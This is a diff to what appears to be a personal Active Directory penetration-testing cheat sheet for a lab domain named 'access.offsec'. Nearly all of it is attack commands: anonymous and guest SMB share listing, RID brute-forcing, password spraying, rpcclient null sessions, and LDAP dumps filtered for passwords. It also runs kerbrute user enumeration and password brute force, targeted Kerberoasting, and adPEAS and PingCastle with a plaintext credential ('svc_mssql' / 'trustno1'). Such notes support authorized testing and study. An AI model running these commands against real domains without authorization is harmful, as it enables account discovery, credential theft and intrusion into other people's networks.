@@ -24,13 +24,15 @@ smbclient -N -L //$ip
 smbclient -L //$ip -N
 
 nxc smb $ip -u 'a' -p '' --shares
-nxc smb $ip -u 'administrator' -p '' --shares
+nxc smb $ip -u 'guest' -p '' --shares
 nxc smb $ip -u 'administrator' -p 'fake' --shares
 nxc smb $ip -u '' -p 'fake' --shares
 nxc smb $ip -u users.txt -p users.txt --no-bruteforce --continue-on-success
+nxc smb $ip -u ‘guest’ -p ‘’ --rid-brute
+nxc smb $ip -u ‘guest’ -p ‘’ --rid-brute > u.txt
 
-rpcclient -U "" $ip 
-rpcclient $ip -N -U ""GetNPUsers.py $ -dc-ip $ip -usersfile users.txt -format hashcat -outputfile hashes.txt
+rpcclient -U "admin" $ip 
+rpcclient $ip -N -U ""
 
 # Check if password policy was manually made easier, hidden passwords
 ldapsearch -x -H ldap://$ip
@@ -39,15 +41,14 @@ ldapsearch -x -H ldap://$ip -b "DC=,DC="
 ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)'
 ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)' sAMAccountName sAMAccountType
 ldapsearch -x -H ldap://$ip -b "DC=DomainDnsZones,DC=,DC="
-ldapsearch -H ldap://$ip -D 'ldap@$dom' -w '$pass' -b 'dc=,dc='
+ldapsearch -H ldap://$ip -D "enox@$dom" -w "$pass" -b 'dc=,dc='
 ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)' | grep -vi "objectClass\|distinguishedName\|instanceType\|whenCreated\|whenChanged\|uSNCreated\|uSNChanged\|objectGUID\|userAccountControl\|codePage\|countryCode\|objectSid\|accountExpires\|sAMAccountType\|isCriticalSystemObject\|dSCorePropagationData\|lastLogonTimestamp\|showInAdvancedViewOnly\|groupType\|msDS-SupportedEncryptionTypes:\|lastLogoff\|badPasswordTime\|ref:\|#\ num\|#\ search\|search:\|result:"
 ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)' | grep -vi "objectClass\|distinguishedName\|instanceType\|whenCreated\|whenChanged\|uSNCreated\|uSNChanged\|objectGUID\|userAccountControl\|codePage\|countryCode\|objectSid\|accountExpires\|sAMAccountType\|isCriticalSystemObject\|dSCorePropagationData\|lastLogonTimestamp\|showInAdvancedViewOnly\|groupType\|msDS-SupportedEncryptionTypes:\|lastLogoff\|badPasswordTime\|ref:\|#\ num\|#\ search\|search:\|result:" | grep -i "pass\|pwd"
 
 # If you attempt to authenticate to an AD server via Kerberos, it's going to say 'hey, continue with pre-authentication'. It doesn't do that with invalid names.
 /opt/kerbrute userenum usernames.txt -d "$dom" --dc $ip
-/opt/kerbrute userenum -d $dom --dc $ip /opt/SecLists/Usernames/xato-net-10-million-usernames-lowercase.txt -t 100
 /opt/kerbrute userenum -d $dom --dc $ip /opt/SecLists/Usernames/xato-net-10-million-usernames-dup-lowercase.txt -t 100
-/opt/kerbrute bruteuser -d $dom ../passwords.tx maintenance --dc $ip 
+/opt/kerbrute bruteuser -d $dom ../passwords.txt maintenance --dc $ip 
 
 psexec.py
 
@@ -74,4 +75,5 @@ python /opt/windows/targetedKerberoast/targetedKerberoast.py -d $dom -u 'hrapp-s
 
 Invoke-adPEAS -Domain 'access.offsec' -Server 'dc.access.offsec' -Username 'access\svc_mssql' -Password 'trustno1' -Force
 Invoke-ADEnum -AllEnum -Force
+.\pingcastle.exe --healthcheck --user access\svc_mssql --password trustno1 --level Full
 ```
